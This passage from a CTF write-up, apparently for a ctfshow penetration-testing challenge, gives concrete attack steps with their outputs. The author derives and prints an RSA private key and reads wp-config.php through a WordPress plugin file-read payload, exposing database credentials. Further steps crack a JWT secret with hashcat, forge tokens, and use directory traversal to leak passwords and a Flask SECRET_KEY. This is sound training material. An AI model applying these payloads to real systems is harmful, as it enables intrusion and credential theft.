34717510509951259155462497189459983874690099575241597111904193711108488616566486665053884629084564364205319797812148684173057523812840684555544241901417</span><br><span class="line">31764044218067306492147889531461768510318119973238219147743625781223517377940974553025619071173628007991575510570365772185728567874710285810316184852553098753128108078975486635418847058797903708712720921754985829347790065080083720032152368134209675749929875336343905922553986957365581428234650288535216460326756576870072581658391409039992017661511831846885941769553385318452234212849064725733948770687309835172939447056526911787218396603271670163178681907015237200091850112165224511738788059683289680749377500422958532725487208309848648092125981780476161201616645007489243158529515899301932222796981293281482590413681</span><br><span class="line">19935965463251204093790728630387918548913200711797328676820417414861331435109809773835504522004547179742451417443447941411851982452178390931131018648260880134788113098629170784876904104322308416089636533044499374973277839771616505181221794837479001656285339681656874034743331472071702858650617822101028852441234915319854953097530971129078751008161174490025795476490498225822900160824277065484345528878744325480894129738333972010830499621263685185404636669845444451217075393389824619014562344105122537381743633355312869522701477652030663877906141024174678002699020634123988360384365275976070300277866252980082349473657</span><br></pre></td></tr></table></figure><p>ç»™äº†npqï¼Œeé»˜è®¤ï¼Œé‚£ä¹ˆç§é’¥è‡ªç„¶è€Œç„¶å…¶å®å°±æœ‰äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Cryptodome.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n=<span class="number">633246888504573920779824237508007735589231666589188021171575950939940255140086052090801972411182075806200277922264916256376952068104942084262732765302869757002336862151158422906662985191392193462511289187123754337854684702016396996198789908170728175626225281406256476216079863574750768787169969475152717430903460149705597463505143799487488630064694962535355825378265518133414832135165998125004282912865895836379205933895029154287788824317000843771251331435939410389957572552746410933103347212260533351406876584798128116835102705770834548333327952204414218313396767348386545933700371706780732081128764732828398879654027694999061445888984652196057717761623666471390226500419047354546009526849190038055817008252022472857695300387827500818231719929626707573775972451255428059119840669826086027702546510213791864358183204530776020004866770536545695330324167569777791175170044812028227494966458864002660598592490354017639158027968836329598282419666463285900175674408026881052737148611395153194390130628356104784358804158581294733196703476913434055209441802708485723455322985654447400945734717510509951259155462497189459983874690099575241597111904193711108488616566486665053884629084564364205319797812148684173057523812840684555544241901417</span></span><br><span class="line">p=<span class="number">31764044218067306492147889531461768510318119973238219147743625781223517377940974553025619071173628007991575510570365772185728567874710285810316184852553098753128108078975486635418847058797903708712720921754985829347790065080083720032152368134209675749929875336343905922553986957365581428234650288535216460326756576870072581658391409039992017661511831846885941769553385318452234212849064725733948770687309835172939447056526911787218396603271670163178681907015237200091850112165224511738788059683289680749377500422958532725487208309848648092125981780476161201616645007489243158529515899301932222796981293281482590413681</span></span><br><span class="line">q=<span class="number">19935965463251204093790728630387918548913200711797328676820417414861331435109809773835504522004547179742451417443447941411851982452178390931131018648260880134788113098629170784876904104322308416089636533044499374973277839771616505181221794837479001656285339681656874034743331472071702858650617822101028852441234915319854953097530971129078751008161174490025795476490498225822900160824277065484345528878744325480894129738333972010830499621263685185404636669845444451217075393389824619014562344105122537381743633355312869522701477652030663877906141024174678002699020634123988360384365275976070300277866252980082349473657</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line"><span class="comment"># print(d)</span></span><br><span class="line">d=<span class="built_in">int</span>(d)</span><br><span class="line">key = RSA.construct((n, e, d, p, q))</span><br><span class="line">private_key=key.export_key()</span><br><span class="line"><span class="built_in">print</span>(private_key.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIJKQIBAAKCAgEAmziayo9Tddo1FYdrtOswyjLYJ5frYKEwm4rQTsKU8UcdnnDR</span><br><span class="line">gms+ZmStoqlH/qi6x+D1K3fvvioCnGZLFHZwBUqbgT5x+qUmUaVMll9FOT7ZJ05w</span><br><span class="line">8n8Ljqa1akzFMU5G7YbCr3vQwN63vwvD9/63TDbXkJrv1fGl2rHpPwp5OPCUeCB3</span><br><span class="line">nIFIRCWHpJU7sHJqIP5vzV8KNJtbxgR+dhszdg+NhoBDUpxoVN5lzSKr2TMOLFLZ</span><br><span class="line">aQR9AWOV/aHV8gjTkTLDZfc+XlfhxiDMTQdiUTbk/tynpt+JFrDA8vL5/TOmuxgu</span><br><span class="line">mqgXZIPGrIUbwloTYyHD/XXmvXu5KE8g3eMKgxNxuEKM5bMTESBK9A7Q2Kj3eNp0</span><br><span class="line">Rvb5Aleg7h8/YbQemGelY/o5xpUyHgHjsfNQ3j/xhdhVCNVaXZF64V/YVpvC9Cq2</span><br><span class="line">9F7qI+bl6FlN7zSpuHB3QgNS1uXOmjBCsA7ypZoWmdXeaLIO+I3kP48BBSmue4ni</span><br><span class="line">dJifiK/kSOcZ0iegRXV1hyZ6pYdDE7hM5V5t5tvayJ31zRQNT2ALAFeCDozVWELH</span><br><span class="line">TnphkPkQO+SOPglrVz0S1dXicqRofXWMj7PJOFkBpWIX0aywMIh1woEAawUs3RM2</span><br><span class="line">pfLUNtqUTfodSCmWlwcpGrBWG5NACx7csPFtzWn8oPZfzL346at5DDIwD2kCAwEA</span><br><span class="line">AQKCAgA+oGYD2DQqVrIYT50rT8FNs5n2z5rOT/rWpvlI7cU+XB0dMhO19SMmGPTd</span><br><span class="line">rkM4AkfqIV+J/Egkh7qp87PTO74SxHldeh5urHd7daAjA6lgYXUoIMP9czjsg2Kq</span><br><span class="line">0vK05ApGB5tBRkmBp9qnIE4fHwxBmdb7pyehQHBUfnfHUah7SsX8ec0Ivji0FhhW</span><br><span class="line">VUfR9zfOvBnL2M67TvuGN4X2jR8EQV4uqE2BZU3LADg+vgBsD+dmBr9lWcQ97To1</span><br><span class="line">LTivANSrvrmLyGfHlNmpIM6NPa9zaRyXn9ucvpAHMaWH4HTwrghVcHpNOAjIK0rb</span><br><span class="line">jJEYp1MvKg5zk0BXrzWTh+mQ3Ov+NXrbdDspmeZsY02SuyPheOBHHHs7cHANPcRH</span><br><span class="line">1Nl/nxXkRF9H+oSOmTQi7wjZbhrEFFCeCK2TuT8vyf0p+lQMPEc+cAFn5rSXnhii</span><br><span class="line">W2Mq6nwx5Nbllr/hj7oVeyGrUZFskvbZnYYVM4NTFqUPBzQbBuQTGGfccZc9OrJx</span><br><span class="line">2qpDZdUknQe9ZI742c2vZRTqY2yZX6InR8JoQbmscke4LRdUMHH6G/PbfkqPXfFy</span><br><span class="line">r5mxscghP+kRFj86dyL03CB039N23xCNezK/AGE/6JzJgwpvUPaYtvnIuhSFQEmH</span><br><span class="line">DGrYYrDXSbwTT0ufM/tIEuHMHXT4DYX3nm94SG8wB/b3zpFdAQKCAQEA+56kjWCg</span><br><span class="line">Wcjo+QUgp50+BIa5hkFoV16QOCQEsqh+s5rhVMke7svuo5+U6C/rNFIkpR1iKRPL</span><br><span class="line">3LOqJ8B5P7ZAPdhbHAPjdtnUDbPzM1r0RYpjbJPh4AcRVqhDTWy20Yd7iZN9mHxH</span><br><span class="line">SKBZ4Txn20gvkHamPVlPMejsDRpDoauS/euzn2GlG9GPq7i5vHwQiy6sYZAPm9Ey</span><br><span class="line">z+XxsQNiqB32tHnZqYrj/GS64Jx6eaa5MdSCLIPkHHWAUHzBQ5A8/bNTFf8VAYri</span><br><span class="line">R9GnTZF8oSNne6oD62IYVzDH2wWOWSnUKdAdsnaahJLvHQnWbz6itWPWj+2TrjLS</span><br><span class="line">nl9Tz7uuhrRjcQKCAQEAnexbL5Sov7N4W7BrZZao8cKEnM6goDpUjqgEnlIG4FF+</span><br><span class="line">UVmBzuAYNlLjOXW7fKK6nt5q95R1AA72FpfOHbZnTTYHm9u1zUecIeuvNVjxi9sw</span><br><span class="line">hmhMn43pxaQcUfgWSsCrqH+8SrVEz8Lc7V2lbswx/V94PC8Za7ZLSr+FOz6X7C71</span><br><span class="line">sLQR8XI3SkrZIkmL150N8LO4WdKAtKKIfvz7Lo2xLxpGLNJ3Xf/NW51wMs5BwQNz</span><br><span class="line">EUWRUmkgCmeU74m47TCSOj580qLLT0Hxj1jRhecZOs0DHqDCeHt0hz82EtOcw1TB</span><br><span class="line">JKTly3Xj/UjGRpzEmo8rAuU8XoKc/NkmaZCjpxh/eQKCAQEArbI5E+OFLhXURbs1</span><br><span class="line">bJ/OpR8/yR8z4URFOIwcthw8ws2DCZ2A/gXHaiqKh7I0oryl0Vm0Xnjs/SEFsEVd</span><br><span class="line">Lg8oz8igNHm2t1/t07vKgkQiZjL/KX/4qEcYwAKN20/V8FSfgjxPskjwiIExKpwh</span><br><span class="line">ca2mMArH/Ye+dMy+zti3oU4ovaLNL5Qff1Gt5TQy+5uFbB8/HmZtb/n9IqkwrCqT</span><br><span class="line">G0z79mA7Up+vfJcork82+O2P4Ic7iXFOshqnBmjonTRf9h6pl4CsRpFSXZOr848g</span><br><span class="line">QriHAkY+SGpCNUZWYKq4NnL6pBanuX/IcQZhjGEzJz5M4fzWrCqsDM/Gt09FMxzz</span><br><span class="line">gMfb8QKCAQEAhnF+W65yTulKELzLYWv2ngLchOY/xsiBzgTqEaKBahzWrgjGQsly</span><br><span class="line">s2SzPuqk14Ft4Ow3IljHlmomRKut9IuhvBDAP4a3anCJUjNkMMVstYS/9dz7RmY5</span><br><span class="line">W2HQHlRXHgKS4NsGAI/7aehZztYHjaDW+f55zLrIKHPD+3m6weoSyiZcUberAuMa</span><br><span class="line">gOvhmJgGLmPtRzqpOgbEPYOVMo7KhCJqclAq5+OxbVvlhxYsO4RuZBQ8tLqF8iO+</span><br><span class="line">/DychaS4w2yzQFSMTYH8FZhtPnz9usI4L1/zRPLVPF7VoIJG1ZZDgeM4nqqnWyQd</span><br><span class="line">GTcIXXr+wRobItbnIwqM/ZEca4iQWiO3+QKCAQAjp153c8JvZhR3Stan0bKYHzMm</span><br><span class="line">FWEUjmygq6xgzclvkWWYmHwHvYjO4tITXHSmEt5GrUY/W1LOA0x9HRMUh7p71tw6</span><br><span class="line">7ni/lELMlT6Sk3b32SRoftEr5SmNEZlXPh2UYC260FkXNj3hhShv7DAZyV2bthqk</span><br><span class="line">YV63M7neAAU5YPmq0uvMvxHv1D17bswwbiJ3mzb/E4CSR2gDkKrZGshtJbKUtLvb</span><br><span class="line">wEigkCIjw+UFRhLiK4R+OIL7bZtE2unbYWeL1h4w1BLwFJPg/26Gnq91V96GwoKf</span><br><span class="line">JiAEy9wfJBnCwJPdr9OV9GGrMfBRF8Rkl6YyvNNb21C6ZABBuAzWpfu0I60h</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>ç„¶åç”¨èµ›åšå¨å­è§£å¯†å³å¯ã€‚</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250107133135686.png" class="" title="This is an example image"><p>è§£å¾—æ˜æ–‡å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Park:</span><br><span class="line">ä½ çš„è¡ŒåŠ¨å·²ç»æš´éœ²ï¼Œ24å°æ—¶å†…è¿…é€Ÿæ’¤ç¦»ï¼Œé”€æ¯æ‰€æœ‰èµ„æ–™ï¼Œå°†ç°æœ‰èµ„æ–™ç»Ÿä¸€ä¸Šä¼ åˆ°ã€ä»»åŠ¡ä¸­å¿ƒã€‘</span><br><span class="line">å‘é€äººï¼šDylan</span><br><span class="line">Park:</span><br><span class="line">æ€»éƒ¨å·²ç»ä¸ºä½ å®‰æ’æ–°çš„èº«ä»½ï¼Œè¯·åŠ¡å¿…åœ¨3æ—¥å†…æŠµå°ï¼Œä½ çš„æ–°èº«ä»½æ˜¯æ–°ç«¹å¿åŠ¨ç‰©ä¿æŠ¤é˜²ç–«æ‰€ç½‘ç»œå®‰å…¨é¡¾é—®ï¼Œã€ä»»åŠ¡ä¸­å¿ƒã€‘è´¦å·å¯†ç å’Œä½ ä»»èŒå•ä½ç½‘ç«™çš„æ•°æ®åº“ç”¨æˆ·åå¯†ç ä¸€è‡´ï¼Œè¯·å°½å¿«ä¿®æ”¹ </span><br><span class="line">å‘é€äººï¼šDylan</span><br><span class="line">Park:</span><br><span class="line">ã€ä»»åŠ¡ä¸­å¿ƒã€‘ç½‘å€å·²å˜æ›´ä¸º https://task.ctfer.com ï¼Œè¯·æ³¨æ„ä¿®æ”¹æµè§ˆå™¨åœ°å€æ ä¸­çš„é“¾æ¥ </span><br><span class="line">å‘é€äººï¼šDylan</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æäº¤parkåœ¨ä»»åŠ¡ä¸­å¿ƒç™»é™†çš„è´¦å·å¯†ç </span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬è¦åšçš„æ˜¯è·å–ä»»åŠ¡ä¸­å¿ƒçš„è´¦å·å¯†ç </p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101072658240.png" class="" title="This is an example image"><p>ä¸Šé¢çš„å¯†æ–‡ä¸­è¯´åˆ°è¿‡äº†ï¼Œä»»åŠ¡ä¸­å¿ƒçš„è´¦å·å¯†ç å’Œæ¹¾æ¹¾æŸä¸€g*vçš„æ•°æ®åº“è´¦å¯†æ˜¯ä¸€æ ·çš„ï¼Œé‚£å°±è¯´æ˜æˆ‘ä»¬è¦å»çœ‹çœ‹æ¹¾æ¹¾çš„g*vã€‚è¿™é‡Œå°±ä¸è´´å›¾äº†ï¼Œæœ‰ä¸€ä¸¢ä¸¢æ•æ„Ÿã€‚ã€‚</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101072844550.png" class="" title="This is an example image"><p>wordpressï¼Œé‚£å°±wpscanæµ…æµ…æ‰«ä¸€ä¸‹</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101081055976.png" class="" title="This is an example image"><p>å‘ç°æ’ä»¶ç‰ˆæœ¬out of dateä¸”ç»™å‡ºäº†å…·ä½“ç‰ˆæœ¬ï¼Œé‚£ä¹ˆå»wpscanå®˜ç½‘æŸ¥æŸ¥ç›¸å…³æ¼æ´è¯•è¯•</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101081718877.png" class="" title="This is an example image"><p>å°è¯•åç›´æ¥è·å–æ•æ„Ÿæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?aam-media=wp-config.php</span><br></pre></td></tr></table></figure><p>å›¾å°±ä¸è´´äº†å˜¤å˜¤å˜¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">define( &#x27;DB_USER&#x27;, &#x27;hsinchug_wp1&#x27; );</span><br><span class="line">define( &#x27;DB_PASSWORD&#x27;, &#x27;Q.4Vyj8VCiedX1KYU5g05&#x27; );</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°è´¦å¯†åå°±å¯ä»¥è¿›å…¥ä»»åŠ¡ä¸­å¿ƒäº†ã€‚</p><h2 id="ç¬¬äºŒç« "><a href="#ç¬¬äºŒç« " class="headerlink" title="ç¬¬äºŒç« "></a>ç¬¬äºŒç« </h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æäº¤dylançš„ç”µè¯å·ç </span><br></pre></td></tr></table></figure><p>æ ¹æ®ä»»åŠ¡ä¸­å¿ƒä¸­ç»™åˆ°çš„ä¿¡æ¯æˆ‘ä»¬å¯ä»¥å¯¹ç§é’¥è¿›è¡Œæ©ç çˆ†ç ´</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101182540997.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 3 -m 16500 hash.txt --custom-charset1=?l?d 4a4f7d6e8b5?1?1?10c7f</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101183239434.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJoc2luY2h1Z193cDEiLCJleHAiOjE3MzU4MTI2ODR9.vwzjhUY2xVSdKrdG2KznZ-kWWLBHvE7KTtLtFr4bRBo:4a4f7d6e8b5e3a0c7f</span><br></pre></td></tr></table></figure><p>æŠ“æ˜¾ç¤ºç”µè¯å·ç çš„åŒ…ï¼Œç„¶åæ”¹JWTå³å¯ã€‚</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101183305907.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">åœ¨ä»»åŠ¡ä¸­å¿ƒæœåŠ¡å™¨ä¸Šæœç´¢ç§˜å¯†è´¦æˆ·ï¼Œç”¨æˆ·åå¥½åƒæ˜¯rootï¼Œæäº¤ä»–çš„å¯†ç </span><br><span class="line"></span><br><span class="line">éç³»ç»Ÿç”¨æˆ·root æ˜¯webé‡Œé¢çš„ç”¨æˆ·åroot</span><br></pre></td></tr></table></figure><p>ç„¶åæ³¨é”€ï¼Œç™»é™†çš„æ—¶å€™æŠ“åŒ…ç‹‚æ”¹jwt</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101184432121.png" class="" title="This is an example image"><p>ç„¶åå°±å¤šäº†ä¸€ä¸ªadministratorç•Œé¢ï¼ï¼</p><p>æŠ“åŒ…è·å–ä¸‰ä¸ªæ¥å£ï¼š</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101184907151.png" class="" title="This is an example image"><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101184915535.png" class="" title="This is an example image"><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101184935859.png" class="" title="This is an example image"><p>listTaskFilesæ¥å£å¥½åƒå¯ä»¥è·å¾—ç›®å½•æ–‡ä»¶ï¼Ÿï¼Ÿè¯•è¯•çœ‹</p><p>&#x2F;getServerInfoè·å–å†…ç½‘åœ°å€</p><p>&#x2F;downloadTaskFileé€šè¿‡urlä¸‹è½½æ–‡ä»¶ï¼Œæ—¢ç„¶æœ‰å†…ç½‘åœ°å€å’Œç›®å½•äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ˜¯ä¸æ˜¯å°±å¯ä»¥ä¸‹è½½æ–‡ä»¶äº†ï¼Ÿï¼</p><p>ä½†æ˜¯è¯•äº†ä¸€ä¸‹ä¸å¤ªè¡Œï¼Œåæ¥å‘ç°åœ¨listTaskFilesçš„bp dashboardå¤„ç›´æ¥æ”¹åŒ…å‘åŒ…ä»¥åï¼Œæµè§ˆå™¨ä¸Šæ˜¾ç¤ºæ–‡ä»¶ï¼Œç„¶åç›´æ¥è¯»å°±è¡Œ</p><p>å¤šäº†ä¸€ä¸ªè·¯ç”±</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101185518497.png" class="" title="This is an example image"><p>è¿™ä¸ªtaskfilesç›®å½•ä¸‹æ²¡å•¥ä¸œè¥¿ã€‚ã€‚ã€‚è¯»åˆ°éƒ½æ˜¯æ²¡ç”¨çš„ï¼Œé‚£å°±è¯´æ˜éœ€è¦ç›®å½•ç©¿è¶Šã€‚</p><p>å°è¯•äº†..&#x2F;ï¼Œå‘ç°è¿‡æ»¤äº†ï¼Œæ²¡åŠæ³•</p><p>å°è¯•ç½®ç©ºï¼Œè¯»å–åˆ°ä¸Šä¸€çº§ï¼Œä½†åº”è¯¥æ˜¯æ ¹ç›®å½•ï¼Œè¿™å°±ä¸çŸ¥é“äº†</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101190115408.png" class="" title="This is an example image"><p>å‘ç°ä¸€ä¸ªinit_users.jsonï¼Œç›´æ¥è¯»</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250101190237762.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7y.(sc#Ac_</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æäº¤ DATABASE_SECRET_KEYå†…å®¹</span><br></pre></td></tr></table></figure><p>ç„¶åçœ‹ä¸‹ä¸€å…³ï¼Œ<strong>æäº¤ DATABASE_SECRET_KEYå†…å®¹</strong></p><p>å…ˆçœ‹çœ‹main.py.bakæ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, session</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> url_for, redirect</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> basename, join</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;3f7a4d5a-a71a-4d9d-8d9a-d5d5d5d5d5d5&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&#x27;guest&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log server is running&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_session</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;user&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;user&#x27;</span>] != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/key&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/log_server_key.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            key = f.read()</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;key&#x27;</span>: key&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/set_log_option&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_log_option</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    logName = request.args.get(<span class="string">&#x27;logName&#x27;</span>)</span><br><span class="line">    logFile = request.args.get(<span class="string">&#x27;logFile&#x27;</span>)</span><br><span class="line">    app_log = logging.getLogger(logName)</span><br><span class="line">    app_log.addHandler(logging.FileHandler(<span class="string">&#x27;./log/&#x27;</span> + logFile))</span><br><span class="line">    app_log.setLevel(logging.INFO)</span><br><span class="line">    clear_log_file(<span class="string">&#x27;./log/&#x27;</span> + logFile)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log option set successfully&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get_log_content&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_log_content</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    logFile = request.args.get(<span class="string">&#x27;logFile&#x27;</span>)</span><br><span class="line">    path = join(<span class="string">&#x27;log&#x27;</span>, basename(logFile))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log 